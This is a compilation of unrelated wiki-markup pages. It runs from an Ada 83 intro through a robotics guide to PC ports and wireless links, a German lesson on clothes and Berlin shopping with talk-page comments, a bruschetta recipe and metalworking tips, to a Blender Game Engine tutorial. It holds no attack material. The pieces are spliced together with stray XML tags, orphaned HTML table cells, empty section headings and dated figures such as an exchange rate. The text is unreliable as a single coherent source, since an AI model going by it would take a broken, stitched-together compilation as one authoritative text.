'''Ada 83''' is the first version of the [[Wikipedia:Ada (programming language)|Ada programming language]]. It was based in the so called [[Ada Programming/Ada 80|Ada 80]], a preliminary version of the language formally known as MIL-STD-1815 (published in December 1980). This standard was refined and standardized by the [[Wikipedia:United States Department of Defense|DoD]] and [[Wikipedia:American National Standards Institute|ANSI]] as '''ANSI/MIL-STD-1815A''' in February 1983 (note the additional 'A' at the end), which was later adopted by [[Wikipedia:International Organization for Standardization|International Organization for Standardization]] as ISO/IEC 8652:1987.

      <text xml:space="preserve">Personal computers (PC) have a large number of ports to which you could add you own hardware to control your robot. Some of these are very easy to use, while others are nearly impossible without special (expensive) ICs. Not all of these interfaces are available on all computers. This section gives an overview of some of the best known ports on a PC. These ports and their uses are well document all over the internet. 

==External Ports==
These are all the ports that are available on the outside of a PC. Most computer users are familiar with them (or at least know them by name and looks). 

===Serial Port===
The serial port is one of the two easiest to use ports on a PC. This port consist of 2 wires to transfer your data (one for each direction) and a number of signal wires. This port is reasonably sturdy, and if you know some digital electronics or use a microcontroller, is pretty easy to use too. It is limited on speed and can only connect two devices directly. By using special ICs you can connect the serial port to a [[Serial Programming/RS-485|RS-485 network]] and connect it to multiple devices.

* [[Serial Programming/RS-232]]
* [http://www.beyondlogic.org/ This site] contains a lot information on serial ports (among others).

===Parallel Port===
The parallel port is the second of the easiest to use ports on a PC. This port uses 8 lines to transfer data and has several signal lines. Modern parallel ports can send and receive data. This port is easier to use, but less sturdy than the serial port. Since it operates on TTL voltage levels  (0 and 5V) it can connect directly to microcontrollers and TTL logic.

[http://www.beyondlogic.org/ This page] covers parallel ports and the differend modes of operation.

===USB===
USB is the successor of the serial port. It's faster and allows connecting devices without turning off the PC. Some modern microcontrollers have built in USB support.

* [http://www.beyondlogic.org/ Everything] you'd need to know about USB.
* [[Serial Programming:USB Technical Manual]]
* [[Embedded_Systems/Particular_Microprocessors#USB_interface]]

=== IEEE 1394: Firewire, i.link, Lynx===
{{wikipediapar||FireWire}}

IEEE 1394 also known as FireWire, i.link or lynx is a (much) faster port, similar to the USB port. It reaches speeds up to 400Mbit/s.

* [http://www.hardwarebook.net/connector/bus/ieee1394.html The Connector]
* [http://www.commsdesign.com/main/multsupp/0002/0002fire.htm Article] about IEEE 1394.
* [http://wiki.linux1394.org/ Linux FireWire wiki]

===Keyboard Connector===
Keyboards use TTL level signals to transfer button presses and releases to the PC. A keyboard sends a code when a button is pressed and sends another one when the button is released. This port could be used for some purposes.

See [http://www.beyondlogic.org/ this site] for a in depth explanation and example of how to interface the keyboard. (menu: miscellaneous -&gt; interfacing the AT keyboard) Covers both how to replace the keyboard as how to use the keyboard for other purposes.

===Ethernet===
Ethernet can be used to connect other devices to a PC. Complete webserver-on-a-chip are available these days, and an ethernet network can be a way to connect multiple devices in a robot (and even hook it up to the internet and let people control the robot from all over the world).

==Internal Ports==
These are the connectors inside the PC, generally these are used with special PCBs (called cards). Although harder to use, they offer great speed.

===ISA===
ISA was the (8-, later 16-bit) bus where you plugged your video, sound, IDE and network card in the old days. You'll find these on PC up to (some) early Pentium II (the latter usualy has only 1 E-ISA socket, if any). 
This bus is pretty easy to use for your own projects and well documented on the internet. 

[http://www.hardwarebook.net/connector/bus/isa.html ISA bus connector]
[http://www.hardwarebook.net/connector/bus/isa_tech.html More indepth explaination of the ISA bus]

===PCI===
PCI is the successor of the ISA bus. It's a faster 32bit bus. Since it support plug and play, a PCI device needs a few registers which identify the component and manufacturer. 
[http://www.techfest.com/hardware/bus/pci.htm This page] covers most of the basics of the PCI bus.

===AGP===
The Accelerated Graphics Port is aimed at 3D graphic cards. It's a fast bus, but optimized for graphics.

===PCI Express===
PCI Express replaces both PCI and AGP. It's quite different from all the other busses, as it uses serial communication, rather than parallel. Its speed depend on the number of &quot;lanes&quot; (serial connections) used PCI Express support 1, 2, 4, 8 and 16 lanes.

==Wireless==
These are &quot;ports&quot; too as they can be used to connect other devices to the PC. 

===IRDA===
IRDA is an infrared communication port. Modern versions reach speeds up to 4Mbits/s. IRDA may be a good alternative to wires for table top robots. Since it's an Infrared port it needs a line of sight to work reliable and its range is limited to 1m.  
Note that this port works at a much higher speed than remote controls and therefor standard remote control repeaters may not work reliable for IRDA.

[http://www.hw.cz/english/docs/irda/irda.html This] site covers the basics of IRDA.&lt;BR&gt;
[http://www.hardwarebook.net/connector/pc/mbirda.html Here] is a pinout of the mainboard IRDA connector.

===WiFi / WLAN / 802.11 / Wireless Ethernet===
All the names in the headline are synonyms for the same technology. WLANs are commonly used in PCs (especially laptops) as data networks. The bandwidth available is in the order of several megabits per second or more, far more than normally is necessary in any robotics project. A WLAN typically reaches about 100m, but with special directional antennas far more is possible (in a specific direction).

A WLAN is the obvious choice if your robot has an inbuilt PC or perhaps even PDA for control. Also, when you have ethernet connectivity in your controller (reasonably low cost but not a standard feature except in certain kits), there are low cost (~€50) WLAN bridges available, such as the D-Link DWL-810+ and DWL-G810. 

If you only have a serial port available, a ''wireless device server'' could be used. The cost of one of them is, however, over €100.

===Bluetooth===
Bluetooth is a low bandwidth protocol most commonly found in cellular phones. It is increasingly being deployed in laptops, and there are separate USB &quot;sticks&quot; available as well. Bluetooth can be used for making a serial connection wireless - there are Bluetooth serial ports available on the market, which can be used as converters. Total bandwidth in the system is about a megabit per second, with range up to about ten meters (standard Bluetooth, 2.5 mW), or about hundred meters (industrial Bluetooth, 100 mW). There are limitations on scaling with Bluetooth - it is mostly deployed in 1:1 links even though the standard includes networks with up to 8 active nodes (and even more passive ones). This means that if you plan on building large amounts of robots with a common communication network, Bluetooth might be less well suited.

*[http://www.telecomspace.com/wirelessnw-bluetooth.html Bluetooth resources]

===ZigBee===
ZigBee is a protocol stack based on the 802.15.4 wireless network communication standard. It is low-cost, low-power and all-in-all perfectly suited for low-bandwidth communication needs. The bandwidth is on the order of tens to hundreds kilobits per second, and the range is up to about a kilometer, depending on equipment.

Interesting solutions are [http://www.maxstream.net/products/ XBee from Maxstream], which basically provide a wireless serial link. There also is a list of other vendors at [[w:ZigBee]].

===UWB===

===Wireless USB===

===Cellular networks===
A possibility is to use standard cellular networks (mobile phones). It is only a viable solution for large-scale geostationary outdoor applications with low communication needs though, because of cost, latency and bandwidth limitations.

===Radio modems===
Radio modems are normally older proprietary solutions for wireless linking of serial ports. Proprietary solutions probably shouldn't be considered for new designs.


==Using a PC or laptop in a robot==

PCs have the benefit of abundance of memory, program space and processing power. Additionally they provide the best debug I/O (screen, keyboard and mouse) you could wish for. But they do have a few flaws that limit their usefulness in a mobile robot.

*First of all their size. Even the smallest PC, a laptop, is quite bulky and forces you to use a rather large frame.
*Secondly, except for a laptop, power consumption is large and provide AC-power on a mobile unit is bulky as you need heavy batteries and an inverter.
*Lastly Pcs are lousy when it comes to getting a reliable accurate timing from the outside world. 

The first two points basically shape most of your robot's frame and other than using a different controller not much you can do about it. Picking the best hardware you can find is pretty much all that can make these points a little less troublesome.

The last point is quite easy to get around. Most PCs have a serial port. Most microcontrollers have a serial port as well. Use a level converter to connect the TTL level serial port of the microcontroller with the RS232 level computer serial port and use a little program that handles the accurate timing in the microcontroller and transfers this information to the computer through the serial connection. This is a very powerful setup that combines the strengths of both the PC and the microcontroller.

See [http://www.tronisoft.com/cat_rs232ioboard.php this site] for example interfacing hardware for the serial port.
Covers an I/O module and RS232 to TTL level converter for use with robotics or microcontroller based projects.

Some microcontrollers provide USB or Ethernet ports, which can be used in pretty much the same way, although the software would be a bit harder to implement.

[[Image:Gedaechtniskirche-berlin.jpg|300px|thumbnail|Gedächtniskirche auf dem Kurfürstendamm, Berlin]]

&lt;big&gt;&lt;big&gt;&lt;big&gt;Lesson I.7: Kleidung&lt;/big&gt;&lt;/big&gt;&lt;/big&gt;
----

==Hello from Berlin!==
In every Lesson from 7 - 15 there is going to be a featured German-Speaking city, which will be the theme of the lesson. For 7 - 8 it is Berlin. There will be famous locations in Berlin, for this lesson it's Kurfürstendamm and KaDeWe, the shopping area of Berlin. Also in each lesson there will be facts, so if you ever travel to a German-Speaking country, it'll be like you are a native!

===Facts===
====It's Time to Change Time====

Berlin's time is GMT+1.  That means that they are 6 hours ahead of E.S.T. If it's 2:00pm in New York City, it's 8:00pm (or 20:00) locally. Please note that Germany changes to and from daylight-saving time a few weeks before the U.S., so time differences still vary in March and October.

====Tip, Tip, and More Tip====

In contrast to many other countries where waiters sometime 'live on the tips' in German-speaking countries service personnel always receive a regular wage (usually per hour) and the tip is always an extra for good service. Not to give a tip will probably give the waiter the impression that either service or product were not that good and you are too polite to admit this, but not tipping is not considered 'rude'.
If you tip you usually round up, up to 50 Cents for coffee or up to the next 5 euros for lunch, e.g. 2,70 € becomes 3,00 € and 21 € become 25 €. Also, tipping is only expected when you get served, i.e. when the service personnel bring something to your table, so if you pay at a counter – like at McDonald's or StarBucks – you don't tip at all.
Only when having a large party, like celebrating your birthday in a restaurant, you do extra tipping. For a night you should pay 30 EUR to 80 EUR per waiter and give it separately to the manager (“für die Bedienung”).
In many restaurants it is normal the tip is shared with the kitchen personnel. Paying with credit card or debit card makes tipping difficult, because there is no line on the bill to fill in the tip. Always tip when paying, don't leave money on the table.

====Shopping Locations====

There are two major shopping locations. The '''''Kurfürstendamm''''' in the old west is lined with boutiques and department stores. It continues eastwards for about three hundred yards where you can visit '''''KaDeWe''''', the biggest department store in Europe. On the newly-developed '''''Friedrichstraße''''' in the old east, the famous French store Galleries Lafayette is to be found together with a maze of underground shopping malls. Shops are generally open 9am-8pm Monday through Saturday. In the outskirts most shops close at 4pm on Saturdays.

== Shopping ==
There is a lot to say about shopping, places to shop at, money and items to buy. In this lesson we will cover most of it. There are two big shopping locations in Berlin. They are Kurfürstendamm and KaDeWe.

===Kurfürstendamm===
*'''Kurfürstendamm'''

:''Tauentzienstraße''

:''Fasanenstraße''

The Kurfürstendamm has many boutiques, department stores, etc., which are on Tauentzienstraße and Fasanenstraße, two streets in Kurfürstendamm. Tauentzienstraße has a lot of the department stores, including KaDeWe, which we will get into greater detail later. Fasanenstraße has a lot of the boutiques. &lt;!-- &quot;Kurfürstendamm&quot; is a street, as Tauentzienstraße and Fasanenstraße, so these two couldn't be &quot;in&quot; Kurfürstendamm, they are close together. --&gt;

{| {{German table|Vocabulary|A Shopping Street in Berlin|Kurfürstendamm (Ku'damm)|0|2}}

|-

And some of the things you might say or ask while in a clothing store...

*''Können Sie mir helfen, meine Größe zu finden (für dieses ____)?''
:Can you help me find my size (for this ____)?

*''Wo ist die Umkleidekabine?''
:Where is the dressing room?

&lt;big&gt;[[/Problems#Kurf.C3.BCrstendamm|Section Problems]] &gt;&gt;&lt;/big&gt;

===KaDeWe===
Another shopping location is das KaDeWe, an upscale department store in Germany. It has six floors, and Is also called &quot;The department store of the west&quot; (Kaufhaus des Westens) because it is the largest and most magnificent department store on continental Europe.

{|{{German table|Vocabulary|A Department Store in Berlin|Kaufhaus des Westens (KaDeWe)|0|2}}

Since we already have most of the general shopping phrases and vocabulary down, we are going to get into more detail in the next few sections.

&lt;big&gt;[[/Problems#KaDeWe|Section Problems]]&gt;&gt;&lt;/big&gt;

====Electronics====
First is electronics: it might seem a little sparse, but electronics and much other stuff will be featured in Lesson 12.

{|{{German table|Vocabulary|A Department Store in Berlin|Kaufhaus des Westens (KaDeWe)|0|2}}
!English||German
|- 
|Electronics||die Elektronik
|-           
|Television||das Fernsehen/der Fernseher, die Fernseher (plural)
|-
|Digital Camera||die Digitalkamera, die Digitalkameras
|-
|Telephone||das Telefon, die Telefone
|-

|-
|Computer||der Computer/der Rechner, die Computer/Rechner
|-
|Speaker, Speakers||der Lautsprecher, die Lautsprecher
|-
|DVDs||die DVDs (singular: die DVD)
|-
|CDs||die CDs (singular: die CD)
|-
|DVD Player||der DVD-Player
|-
|CD Player||der CD-Player
|}

''Spielt der DVD-Player auch CDs?''
:Does the DVD player also play CDs?

''Hat das Mobiltelefon/das Handy eine Digitalkamera?''
:Does the cell phone have a digital camera?

If you look at the word order of this sentence, you will see that you've already learned everything you need to make these sentences, and you, yourself can customize these sentences if you want.

&lt;big&gt;[[/Problems#Electronics|Section Problems]]&gt;&gt;&lt;/big&gt;

====Bedding====
The bedding section is also quite bare, but that is because it will be discussed further in Lesson 12. 

{|{{German table|Vocabulary|A Department Store in Berlin|Kaufhaus des Westens (KaDeWe)|0|2}}
!English||German
|- 
|Bedding||die Bettwäsche
|-           
|Blanket||die Decke, die Decken
|-
|Pillow||das Kopfkissen/das/der Polster (Austrian German), die Kopfkissen/Polster
|-
|Pillow Case||der Kopfkissenbezug, die Kopfkissenbezüge
|-
|Sheet||das Betttuch, die Betttücher
|-
|Bed Skirt||der Bett-Rock
|}

And like always here are some of the things you might say that are related to bedding.

*''Passen die Kopfkissenbezüge auf das Kopfkissen?''
:Does the pillow case fit the pillow?

And with that question there are other variations of it you can ask, like... 

*''Passt die Decke auf das Bett?''
:Does the blanket fit the bed?

&lt;big&gt;[[/Problems#Bedding|Section Problems]]&gt;&gt;&lt;/big&gt;

==Money==
Germany, Austria, Luxemburg, Belgium and Südtirol – in other words: all German speaking regions except Switzerland and Liechtenstein– have given up their former currencies and adopted the Euro as of 1999. Because they are not members of the European Union, Switzerland and Liechtenstein have kept the Swiss Francs. Currently 1 EUR is 1.34 USD.

Now if you were at a shopping center in German like Kurfürstendamm, and you were shopping at a boutique here is some vocabulary you might want to know.

*''Was macht das?''
''Was kostet das?''
:How much does it cost?

*''Das Hemd kostet 120 Euro.''
:The shirt costs 120 euros.

*''Das kostet 690 Euro.''
:That costs 690 euros (all together).

{| {{German table|Vocabulary|Money|Geld|0|2}}
!English||German
|- 
|Price||der Preis
|-
|Note||der Schein
|-
|Coin||die Münze
|-
|1 Euro coin||das Eurostück, das Ein-Euro-Stück
|-

|-
|5 Euro note||der Fünfeuroschein
|-
|10 Euro note||der Zehneuroschein
|-
|100 Euro note||der Hunderteuroschein
|}

'''Note:''' The word coin (Münze) mostly turns to Stück when a word or number is put together with it.

Even though in the vocabulary we list the 1, 2, 5, 10, 100 Euro there are more Euro notes. The twenty, fifty, two hundred, and five hundred Euro notes are the ones we didn't list, also there are cent coins.

{| {{German table|Vocabulary|Money|Geld|0|2}}

|- 
|1 Cent Coin||das Centstück
|-
|2 Cent Coin||das Zweicentstück
|-
|5 Cent Coin||das Fünfcentstück
|-
|10 Cent Coin||das Zehncentstück
|-
|20 Cent Coin||das Zwanzigcentstück
|-
|50 Cent Coin||das Fünfzigcentstück
|}

===German Math===
In written German, a comma is used (e. g. in prices) where we would put a decimal point in English. Thus € 5,49 (or 5,49 €) means ''five euros and fourty-nine cents''. When a price ends in a round number of euros, it is most commonly written as € 5,- etc. The reverse is also true. Where as English uses a comma to split up large numbers, German uses a dot. So &quot;€ 6.945&quot; means '''''sechs tausend neunhundertfünfundvierzig''''' (six thousand nine hundred and forty-five) euros - not ''six point nine four five euros.''

===Describing Clothes===

Here are some of the words you can use when you are describing clothes:

{| {{German table|Vocabulary|Adjectives for Clothes|Adjektive für Kleidung|0|2}}
|-
!English||German
|-
|Cheap||günstig, billig
|-
|Expensive||teuer
|-
|Pretty||schön
|-
|Ugly||hässlich
|-
|Soft||weich
|-
|New||neu
|-
|Broad||breit
|-
|Wide||weit
|-
|Tight||eng
|-
|Comfortable||bequem
|-
|Uncomfortable||unbequem
|}

To say I like something or not, for clothing, it's... 

I like it!                            

''Er/Sie/Es gefällt mir!''

I don't like it!                      

''Er/Sie/Es gefällt mir nicht!''

Now if you try something on or you're looking for a soft shirt with a tight fit, you find it, feel it, try it on, but it's fairly expensive you might say this...

'''In English:'''
''The shirt looks great! The shirt feels soft, fits tight. The shirt is very comfortable. How much does it cost? Oh no! The shirt is expensive! 55 euros is a little too much for me.''                

'''In German:'''
''Das Hemd sieht prima aus! Das Hemd fühlt sich weich an, es sitzt eng. Das Hemd ist sehr bequem. Wieviel kostet es? Oh nein! Das Hemd ist teuer! 55 Euro sind mir ein bisschen zuviel.''

The phrases to describe the shirt were...

The shirt looks great.

''Das Hemd '''sieht''' prima '''aus.'''''

The shirt feels soft.

''Das Hemd '''fühlt''' sich weich '''an'''.''

The shirt fits tight.

''Das Hemd '''sitzt''' eng.''

Now, the bold words are verbs that are one part in describing how the shirt is. The other half of describing it is the adjectives like soft, tight, great, etc. And as you can see the verb &quot;looks&quot; is separable, but we will get into that later.

=== Clothing-Related Verbs ===
And now getting into verbs - here are some of the verbs, and also some of these are Separable-Prefix Verbs, like aussehen, anprobieren, and anhaben. But we will study those in more detail later. Also we will be learning about &quot;tragen&quot;.
 
{| {{German table|Vocabulary|Verbs Related to Clothes|Verben im Zusammenhang mit Kleidung|0|2}}
|-
!English||German
|-
|To look||aussehen
|-
|He looks||Er sieht aus
|-
|To try on||anprobieren
|-
|He tries on||Er probiert an
|-
|to put on||anziehen
|-
|He puts on||Er zieht an
|-
|To take||nehmen
|-
|To buy||kaufen
|-
|To have on/wear||anhaben, tragen
|-
|He has on/wears||Er hat an
|}

==Separable Prefix Verbs==

Many German verbs change their meaning by adding prefixs, which are often preposition such as '''ab-, an-, auf-, aus-, bei-, ein-, mit-, vor-,''' or '''zu-'''.The verbs ''anhaben'' (to wear) and ''aussehen'' (to look) are both verbs with '''separable''' ('''''trennbar''''') prefixes. That is, when used next to the subject pronoun, the prefix is separated from the verb and put at the end of the sentence or clause. Or, better put, In the present tense and imperative, the prefix is separated from the infinitive stem.   

Examples:

''&quot;Ich habe einen Mantel an.&quot;'' (&quot;I'm wearing a coat.&quot; Or, more literally translated, &quot;I have a coat on.&quot;)

''&quot;Was hast du an?&quot;'' (&quot;What are you wearing?&quot; or &quot;What do you have on?&quot;)

However, when the separable-prefix verb is put at the end of the sentence, such as when used with  a modal verb, the verb in question and its prefix are not separated.

Examples: 

''&quot;Du willst einen Mantel anhaben.&quot;'' (&quot;You want to wear a coat.&quot;)

''&quot;Willst du eine Bluse anhaben?&quot;'' (&quot;Do you want to wear a blouse?&quot;)

&lt;big&gt;[[/Problems#Separable Prefix Verbs|Section Problems]] &gt;&gt;&lt;/big&gt;

==Tragen==

Instead of ''&quot;anhaben&quot;'' the verb ''&quot;tragen&quot;'' is often used. The sentences from above would then be:

''&quot;Ich trage einen Mantel.&quot;'' (&quot;I'm wearing a coat.&quot; )&lt;br&gt;
''&quot;Was trägst du?&quot;'' (&quot;What are you wearing?&quot;)&lt;br&gt;
''&quot;Du willst einen Mantel tragen.&quot;'' (&quot;You want to wear a coat.&quot;)&lt;br&gt;
''&quot;Willst du eine Bluse tragen?&quot;'' (&quot;Do you want to wear a blouse?&quot;)

The verb ''&quot;tragen&quot;'' has two meanings: &quot;to wear&quot; and &quot;to carry&quot;. So if someone says ''&quot;Ich trage Schuhe&quot;'' only the context will tell you whether the person is carrying the shoes in his hands or actually wearing them. Tragen is a different kind of irregular verb -- one that not only changes at the end of the word, but also changes internally.  Notice that the vowel in tragen's second and third-person forms changes from an '''a''' into an '''ä'''.  Other verbs with similar conjugation patterns include '''fahren, graben, schaffen,''' and '''waschen.'''

&lt;td&gt;er/sie/es&lt;/td&gt;
&lt;td&gt;''trägt''&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;sie&lt;/td&gt;
&lt;td&gt;''tragen''&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

== Colors ==
Color are also another great way to describe clothes like ''Das rote Hemd passt gut.''which means The red shirt fits well. 

Read the following paragraph, try to find the words described to have a color.

''Wir fahren in den Schwarzwald. Ich habe ein grünes Hemd getragen. Die Reise war lang. Es begann kälter zu werden und abzukühlen. Ich hörte Musik auf meinem braunen iPod. Ich bin schließlich eingeschlafen. Als ich aufwachte, sah ich den blauen Himmel und den weißen Schnee.'' 

If you found 5 words you are right.

'''Schwarz which means black (the Schwarzwald (Black Forest) is a wooded mountain range)'''

'''Grünes Hemd which is a green shirt.'''

'''Brauner iPod which is a brown iPod.'''

'''Blauer Himmel which is blue sky.'''

'''And weißer Schnee which is white snow.'''

And now for the actual colors...

 Red                &quot;Rot&quot;     
 Blue               &quot;Blau&quot;
 Green              &quot;Grün&quot;  
 Orange             &quot;Orange&quot;
 Violet             &quot;Violett&quot;

What else should i add in Lesson Four?--[[User:Andrewcool|Andrewcool]] 00:15, 31 Mar 2005 (UTC)

* Don't worry I got it covered :-D --[[User:German Men92|German Men92]] 17:14, 14 Jan 2006 (UTC)

== Lesson Part Finished ==

The lesson part is finished, but it is still open for correction, and minor additions. --[[User:German Men92|German Man92]] 16:35 Jan 16 2006 (UTC)

==passen = fit==

passen means to fit, and sitzen means to sit. but there is names that sitzen means to fit, but most time passen is fit. --[[User:German Men92|German Man92]] 16:49 Jan 16 2006 (UTC)

==Hegla = Helga==

&quot;Hegla&quot; is not a German name. The correct spelling is &quot;Helga&quot;.

==Tip Tip ...==

Actually, tipping is seen very differently. For many older Germans, 5% is quite a lot, and not giving any tip if not really satisfied is by no means considered rude by everybody. Younger ones often are more generous (maybe this is influenced by the American culture where the tip is part of the income of the waiters, or because they are more likely to know some fellow student working at a restaurant ;-) So while Tante Erna might tip the nice young lady who brought her her Kännchen Milchkaffee mit Schwarzwälder Kirsch for 7,30€ with 20 cents, the student Kevin might just leave 70 cents on the table because he'd find it cheap otherwise. Admittedly, those are rather extreme cases, and there certainly are young people who are cheap and many old ones who are very generous... [[User:Thamane|Thamane]] 21:31, 3 April 2006 (UTC)

:I actually live in Berlin, and I see most, if not all, people tip and very well, maybe I just see, or look for people who tip. I don't know, lol. --[[User:German Men92|German Men92]] 20:36, 10 April 2006 (UTC)


==Helga and Maria==
They call each other by there &quot;Vornamen&quot;, so they normaly won't say &quot;Sie&quot;, but &quot;Du&quot;.


==Propaganda?==
Hiya.  I'm actually using the beginnings of this book as a very rough foundation upon which to begin my studies of the German language.  I couldn't help but think that the exercise requiring the student to memorize what is on each floor of a specific department store a bit ridiculous.  Not only does memorizing this not seem important for the study of German or, realistically, for a trip in Germany, it also seems rather like pro-KaDeWe propaganda (imagine a wikibook on the English language having an exercise requiring students to recite the locations of all General Motors factories in the United States as a lesson in geography).  Just seems a bit silly.
:&quot;Propaganda&quot; is sort of harsh isn't it? Maybe it's just some self-promotion. Nevertheless, just skip it if you want. And I guess you can delete it if you are really REALLY bothered by it.[[User:Erebos12345|Erebos12345]] ([[User talk:Erebos12345|talk]]) 09:27, 6 June 2008 (UTC)</text>

{{recipe}} | [[Cookbook:Cuisine_of_Italy|Cuisine of Italy]] | [[Cookbook:Vegetarian_cuisine|Vegetarian cuisine]]

This article describes general preparation procedures for the popular Italian appetizer (or ''antipasto'') '''Bruschetta''' (plural ''bruschette''), slices of toasted or grilled bread rubbed with garlic, drizzled with olive oil, and seasoned with salt and pepper.&lt;ref name=Field&gt;{{cite book |last=Field |first=Carol |title=Italy in Small Bites |publisher=William Morrow and Company, Inc. |location=New York, New York |date=1993 |page=77 }}&lt;/ref&gt; This basic preparation is frequently topped with combinations of flavorful seasonal ingredients. It is a dish coming from the Southern Italian culinary tradition, though variants exist throughout Italy. It is commonly mispronounced in America as &quot;bru-shetta&quot;, but should be pronounced with a hard K sound, &quot;bru-sketta.&quot;

There are many types of ''bruschetta'', some involving special roasted and/or hard bread which may require a different preparation than the one below. 

The recipe below is a meeting point between Northern and Southern Italy, using an Italian or French baguette-style loaf.

You can adapt this recipe to as many servings as you need. As a guideline, you can serve 1 or 2 ''bruschette'' per person.



==Ingredients==
* 1 loaf of Italian or French [[Cookbook:Bread|bread]], sliced 1/2 inch (c. 1cm) thick on the bias
* 1/2 head [[Cookbook:Garlic|garlic]]
* Kosher salt or sea [[Cookbook:Salt|salt]] and freshly ground black [[Cookbook:Pepper|pepper]]
* Extra-virgin [[Cookbook:Olive oil|olive oil]]
* Toppings of your choice (see examples below)

==Procedure==
#Toast the bread slices in a toaster oven, under a broiler, or on a grill, until they turn golden.
#Immediately rub the bread with the cut side of the garlic. Sprinkle with salt and black pepper and drizzle generously with extra-virgin olive oil. 
#Serve warm topped with whatever combinations of seasonal ingredients you choose - ''e.g.'', chopped [[Cookbook:Tomato|tomatoes]] with arugula or [[Cookbook:Basil|basil]], cooked white beans (topped, if you like, with sautéed kale), sautéed mushrooms (preferably wild varieties), minced anchovies flavored with wine vinegar and herbs, thinly-sliced pancetta crisped under the broiler, or a Pugliese-style chopped mixture of summer vegetables (red onion, cucumber, tomatoes, oregano, flat-leaf parsley, basil, and red pepper flakes).&lt;ref name=Field&gt;&lt;/ref&gt;

      <text xml:space="preserve">==Working with Metals==

===Measuring and Marking===
*Do: Measure twice, cut once. Putting it back on is MUCH more difficult than taking it off.
*Do Not: Measure with a micrometer, mark with chalk, cut with a torch. Accuracy is important in moving parts.

===Cutting and Sawing===
*Sawing sheet metal requires a saw with a fine-tooth blade. As a  general rule of thumb at least three teeth should touch the material being cut.
*The teeth should be aimed away from the handle.
*Only apply pressure when pushing the saw away from you, not when pulling back.
*A miter box can be very handy to make straight or 45° cuts. Use a metal box as wooden boxes wear out very fast.

===Drilling===
*Use a punch to make a small indentation where you want to drill the hole.
*Use a slower speed to drill the hole than you would use for wood.
*Use clamps when working with sheet metal. Don't hold it with your hands as metal is very sharp when cut.
*Large holes can be made by drilling a hole and using a file thread or small metal saw to cut the hole. Finish with a half round file.
*A groove can be cut by drilling two holes at the outer edges and using file thread or small saw to connect both holes.

===Filing===
*Files exist in different shapes and different roughness.
*Filing straight: Hold the file diagonal on the surface, apply pressure and move the file upwards while moving from left to right.

===Bending===
Place the sheet metal between 2 wooden boards in a vice. Let the line where you want the material to bend match up with the border of the boards. Use a hammer to bend the metal.

==Working with Plastics==

===Cutting===
Thin plastics can be cut with a sharp utility knife, thicker material can be sawed. When sawing plastic, care must be taken to not melt it.

===Drilling===
Drilling plastic requires a slow speed drill. Special drills for plastics are much better as metal drill can cause the material to crack.

Large holes and grooves can be made the same way as in metal.

===Filing===

===Bending===
Use a heat gun (paint stripper) to heat up the plastic, bend it and let it cool down. Bending can be done by hand.

      <text xml:space="preserve">==Cookbook:Spicy Chilly Chicken==
[[Cookbook:Tomato Sauce|Tomato sauce]] is ambiguous. Please be more specific.
(Which of the 3 types do you mean?)

Are you sure the name should have &quot;Chilly&quot;, not &quot;Chilli&quot; or &quot;Chili&quot;?
To me, &quot;Chilly&quot; means that the chicken is cold or even frozen.

      <text xml:space="preserve">Ever take a good look at a swarm of flying insects? If you did you'd have seen very complicated patterns as if they coordinate their flight with precision. Yet each of these individual insect follow only 2 simple rules:
*Get to the center of the swarm (the safest place)
*Keep your distance from the other insects.

Because of the large number of creatures in such a swarm you get complicated behaviour even from such very simple rules. The same principle applies to ants. Although none of the ants are civil engineers they do succeed in building very complicated habitats.

This same principle can be applied to robots. A large number of small (and cheap) robots can cooperate to tackle a large problem. These swarms of robots are another challenge for robot designers as their behaviour isn't as simple to program as a single robot.

We talk more about &quot;simple&quot; swarming in [[Robotics/Computer Control/Control Architectures/Swarm Robotics]]
and more complicated coordination in [[Robotics/Exotic Robots/Modular and fractal robots]].

}}

The Blender Game Engine is an interesting feature of Blender.  It is basically a 3D environment in which 3D objects move around and react to each other upon contact. One common application is to recreate 3D architectural tours.


In this tutorial, you will learn the basics of object collision within the Blender Game Engine (BGE). From Blender games to use in animations, the bullet physics engine offers a massive number of possibilities. The tutorials found within this wikibook on the subject of the BGE are generally focused on game creation, but the concepts taught within can be applied to a multitude of situations.


As a start, we will teach you to make a ball roll realistically down the hill using Blender's game engine.

== Adding the Hill ==

First, make a plane, then switch to Edit mode ('''TAB'''), and multi-subdivide it with 2 cuts ('''WKEY''' &amp;rarr; ''Subdivide Multi'' &amp;rarr; 2).  Next, enter face select mode ('''CTRL+TAB''' &amp;rarr; ''Faces'') to drag the center face up, in order to form a rough outline of a hill.  Add a subsurf modifier (in the edit buttons) to about 3, then apply.  You should now have a serviceable, but small, hill.  Scale the hill up ('''SKEY''') by about 10 times, and we're ready to add the ball.

'''Noob note:''' 
# You can also use a 3*3 grid.
# Delete the original cube first. 
# The subsurf modifier is not essential.

== Creating the Ball ==

Now, add an icosphere ('''SPACE''' &amp;rarr; ''Add'' &amp;rarr; ''Icosphere'') and relocate it to be just above the hilltop ('''GKEY''' or use the translate widget by pressing '''CTR+ALT+G''').  Let's change the color of the sphere so we can differentiate it from the plane.  Go to the material buttons (with the sphere selected) and click on the white panel beside the COL value. In the color selection wiget that appears, change its color to a bright red.

Next we need to make the Physics engine iterate over it.  With the sphere selected, go to the logic buttons (the little purple Pacman-icon). '''NOTE: In Blender 2.5 and above the Logic Buttons are gone. In order to have the 'Actor' button, click on the button showing 'Blender Render', and select 'Blender Game' Engine. Then go to the physics tab in the buttons menu. There you will see the 'Actor' Button.''' You will see a button in the top left that says ''Actor''. Press it. Now select from the selection box beside of the &quot;Actor&quot; button ''Rigid Body''. This makes the ball roll, instead of staying completely upright the entire time.  You will see a bunch of settings available now. Change ''Radius'' to 2. This changes size the physics engine ''thinks'' the ball is. You notice a dotted circle around the object; this is the boundary.  Now change the ''Radius'' back to 1.  You now have your first Blender game ready to go.

'''Noob Note:''' 
# Make sure you are in object mode first before you add any object.
# '''F4KEY''' is the shortcut to the logic panel.

== Testing your game ==

Now the time has come for the first test of our game.  

# Add a light source well above the hill ('''SHIFT+AKEY''' &amp;rarr; ''Lamp'' &amp;rarr; ''Lamp''). Align in front view ('''NUM1''')
# Press '''NUM5''' to switch to Perspective mode, which gives a realistic view, rather than a view in which objects stay the same size with distance (be sure to switch back to Orthographic view when you are editing again using '''NUM5''')
# Enter textured mode ('''ALT+ZKEY''' -- press '''ZKEY''' to switch back to solid view mode)
# Switch into side view ('''NUM3''') and press '''NUM8''' several times to get a good perspective on the ball.
# Press '''PKEY''' to play the game (Make sure you are in Object mode ('''TAB''')
